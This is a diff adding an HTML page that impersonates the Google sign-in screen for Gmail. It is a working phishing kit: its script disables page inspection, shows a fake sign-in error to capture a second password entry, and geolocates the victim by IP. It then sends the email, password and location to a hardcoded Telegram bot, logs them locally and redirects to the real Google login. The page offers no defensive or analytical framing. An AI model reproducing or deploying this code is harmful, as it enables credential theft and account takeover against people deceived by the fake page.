@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in - Google</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,Arial,sans-serif}
+        body{background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .card{max-width:400px;width:100%;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
+        .logo{text-align:center;margin-bottom:32px}
+        .logo svg{width:75px;height:75px}
+        h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px}
+        .sub{text-align:center;color:#5f6368;margin-bottom:32px}
+        input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
+        input:focus{outline:none;border-color:#1a73e8;border-width:2px}
+        button{width:100%;background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:12px}
+        .error{background:#fce8e6;color:#c5221f;padding:12px;border-radius:4px;margin-bottom:20px;display:none;text-align:center;font-size:14px}
+        .footer{text-align:center;margin-top:32px;font-size:14px}
+        .footer a{color:#1a73e8;text-decoration:none;margin:0 8px}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="75" height="75">
+                <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
+                <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
+                <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
+                <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <div class="sub">to continue to Gmail</div>
+        <div class="error" id="errorMsg">Couldn't sign you in</div>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Email or phone" required autocomplete="off">
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Next</button>
+        </form>
+        <div class="footer">
+            <a href="#">Forgot email?</a>
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+
+    <script>
+        // ========== GANTI DENGAN TOKEN BOT TELEGRAM KAMU ==========
+        const TELEGRAM_TOKEN = "8637326418:AAFe2axKECCMKGwSGwM3mjlmlzvHcOAZpSU";
+        const CHAT_ID = "7619257857";
+        // ==========================================================
+        
+        // Anti inspect
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+            }
+        });
+        
+        let attempt = 0;
+        
+        async function getIP() {
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return 'Unable to get IP';
+            }
+        }
+        
+        async function getLocation(ip) {
+            try {
+                let res = await fetch(`http://ip-api.com/json/${ip}`);
+                let data = await res.json();
+                return {
+                    city: data.city || 'Unknown',
+                    region: data.regionName || 'Unknown',
+                    country: data.country || 'Unknown',
+                    lat: data.lat || 0,
+                    lon: data.lon || 0,
+                    isp: data.isp || 'Unknown'
+                };
+            } catch(e) {
+                return {city:'Unknown', region:'Unknown', country:'Unknown', lat:0, lon:0, isp:'Unknown'};
+            }
+        }
+        
+        async function sendToTelegram(email, password, ip, location) {
+            let message = `🔐 *NEW GOOGLE LOGIN* 🔐\n\n`;
+            message += `📧 *Email:* ${email}\n`;
+            message += `🔑 *Password:* ${password}\n\n`;
+            message += `🌍 *IP:* ${ip}\n`;
+            message += `📍 *Location:* ${location.city}, ${location.region}, ${location.country}\n`;
+            message += `🏢 *ISP:* ${location.isp}\n`;
+            message += `🗺️ *Maps:* https://maps.google.com/?q=${location.lat},${location.lon}\n`;
+            message += `⏰ *Time:* ${new Date().toLocaleString('id-ID')}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🖤 NATZZSEC 🖤`;
+            
+            let url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            let params = new URLSearchParams();
+            params.append('chat_id', CHAT_ID);
+            params.append('text', message);
+            params.append('parse_mode', 'Markdown');
+            params.append('disable_web_page_preview', 'true');
+            
+            await fetch(url, {method: 'POST', body: params});
+            
+            // Kirim lokasi juga
+            let locUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
+            let locParams = new URLSearchParams();
+            locParams.append('chat_id', CHAT_ID);
+            locParams.append('latitude', location.lat);
+            locParams.append('longitude', location.lon);
+            await fetch(locUrl, {method: 'POST', body: locParams});
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            
+            if (!email || !password) return;
+            
+            // Show fake error
+            if (attempt === 0) {
+                document.getElementById('errorMsg').style.display = 'block';
+                setTimeout(() => {
+                    document.getElementById('errorMsg').style.display = 'none';
+                }, 1500);
+                attempt++;
+                return;
+            }
+            
+            // Get data
+            let ip = await getIP();
+            let location = await getLocation(ip);
+            
+            // Send to Telegram
+            await sendToTelegram(email, password, ip, location);
+            
+            // Simpan juga ke local storage (opsional)
+            let saved = localStorage.getItem('logs') || '';
+            let log = `[${new Date().toISOString()}] ${ip} | ${email}:${password} | ${location.city}\n`;
+            localStorage.setItem('logs', saved + log);
+            
+            // Redirect ke Google asli
+            window.location.href = 'https://accounts.google.com/ServiceLogin';
+        });
+    </script>
+</body>
+</html>
